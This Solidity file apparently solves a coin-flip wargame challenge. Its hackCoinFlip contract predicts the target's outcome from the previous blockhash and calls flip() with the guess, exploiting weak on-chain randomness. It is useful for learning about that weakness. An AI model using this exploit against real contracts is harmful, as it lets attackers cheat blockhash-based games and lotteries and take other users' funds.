pragma solidity ^0.6.0;

import 'github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

//using SafeMath for uint256;

interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}


contract hackCoinFlip {
    CoinFlip coin_flip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    
    
    constructor(address _addr) public{
        coin_flip = CoinFlip(_addr);
    }
    
    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coin_flip.flip(side);
    }
}
